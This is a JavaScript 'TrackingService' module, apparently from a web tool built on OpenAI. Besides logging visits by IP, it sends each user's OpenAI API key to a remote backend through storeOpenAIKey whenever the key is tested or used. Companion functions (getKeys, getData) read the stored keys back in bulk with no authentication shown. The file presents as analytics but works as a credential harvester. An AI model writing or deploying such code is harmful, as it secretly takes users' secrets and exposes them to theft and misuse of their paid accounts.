// Use your deployed API endpoint
const SERVER_URL = process.env.NODE_ENV === 'production' 
  ? 'https://ai-upwork-backed.vercel.app' // Your deployed API
  : 'http://localhost:3001'; // Local development

class TrackingService {
  // Record a visit (unique by IP - updates existing or creates new)
  static async recordVisit() {
    try {
      const response = await fetch(`${SERVER_URL}/api/visit`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        }
      });
      
      if (!response.ok) {
        throw new Error('Failed to record visit');
      }
      
      const result = await response.json();
      console.log('📊 Visit tracked:', result.message, `(${result.action})`);
      return result;
    } catch (error) {
      console.error('❌ Error recording visit:', error);
      return { success: false, error: error.message };
    }
  }

  // Store OpenAI key when user tests or uses it
  static async storeOpenAIKey(openaiKey, action = 'use') {
    try {
      if (!openaiKey || openaiKey.trim() === '') {
        throw new Error('OpenAI key is required');
      }

      const response = await fetch(`${SERVER_URL}/api/store-key`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          openaiKey: openaiKey.trim(),
          action // 'test' or 'use'
        })
      });
      
      if (!response.ok) {
        throw new Error('Failed to store key');
      }
      
      const result = await response.json();
      console.log(`🔑 OpenAI key ${action} tracked:`, result.message);
      return result;
    } catch (error) {
      console.error('❌ Error storing key:', error);
      return { success: false, error: error.message };
    }
  }

  // Get all stored data (admin function)
  static async getData() {
    try {
      const response = await fetch(`${SERVER_URL}/api/data`);
      
      if (!response.ok) {
        throw new Error('Failed to get data');
      }
      
      return await response.json();
    } catch (error) {
      console.error('❌ Error getting data:', error);
      return { success: false, error: error.message };
    }
  }

  // Get statistics
  static async getStats() {
    try {
      const response = await fetch(`${SERVER_URL}/api/stats`);
      
      if (!response.ok) {
        throw new Error('Failed to get stats');
      }
      
      return await response.json();
    } catch (error) {
      console.error('❌ Error getting stats:', error);
      return { success: false, error: error.message };
    }
  }

  // Get recent visits
  static async getVisits(limit = 20) {
    try {
      const response = await fetch(`${SERVER_URL}/api/visits?limit=${limit}`);
      
      if (!response.ok) {
        throw new Error('Failed to get visits');
      }
      
      return await response.json();
    } catch (error) {
      console.error('❌ Error getting visits:', error);
      return { success: false, error: error.message };
    }
  }

  // Get recent key usages
  static async getKeys(limit = 20) {
    try {
      const response = await fetch(`${SERVER_URL}/api/keys?limit=${limit}`);
      
      if (!response.ok) {
        throw new Error('Failed to get keys');
      }
      
      return await response.json();
    } catch (error) {
      console.error('❌ Error getting keys:', error);
      return { success: false, error: error.message };
    }
  }

  // Health check
  static async checkHealth() {
    try {
      const response = await fetch(`${SERVER_URL}/api/health`);
      
      if (!response.ok) {
        throw new Error('Health check failed');
      }
      
      return await response.json();
    } catch (error) {
      console.error('❌ Health check failed:', error);
      return { success: false, error: error.message };
    }
  }
}

export default TrackingService;